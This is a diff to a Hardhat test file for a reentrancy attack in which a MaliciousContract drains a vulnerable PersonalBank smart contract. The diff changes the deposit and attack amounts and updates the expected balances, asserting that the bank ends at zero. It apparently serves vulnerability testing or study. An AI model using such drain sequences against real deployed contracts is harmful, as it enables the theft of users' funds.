@@ -29,11 +29,11 @@ describe("Reentrancy Attack for 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol",
     // Initial deposit to PersonalBank contract
     await personalBank.Deposit({ value: ethers.parseEther("2") });
 
-    // Initial deposit from maliciousCOntract on Personal Bank
-    await maliciousContract.deposit({value:  ethers.parseEther("1")});
+    // Initial deposit from maliciousContract on Personal Bank
+    await maliciousContract.deposit({value:  ethers.parseEther("3")});
 
-    // Perform reentrancy attack through MaliciousContract
-    await maliciousContract.attack({ value: ethers.parseEther("1") });
+    // Perform reentrancy attack through MaliciousContract, must be =< than initial deposit
+    await maliciousContract.attack({ value: ethers.parseEther("2") });
 
     // Check balances after attack
     const personalBankBalance = await ethers.provider.getBalance(personalBank.target);
@@ -44,7 +44,7 @@ describe("Reentrancy Attack for 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol",
     // personalBank has a drained account
     expect(personalBankBalance).to.equal(ethers.parseEther("0")); 
 
-    // 2 original balance + 1 from initial deposit +1 from attack 
-    expect(maliciousContractBalance).to.equal(ethers.parseEther("4"));
+    // 2 original balance + 3 from initial deposit +2 from victim fallback function
+    expect(maliciousContractBalance).to.equal(ethers.parseEther("7"));
   });
 });
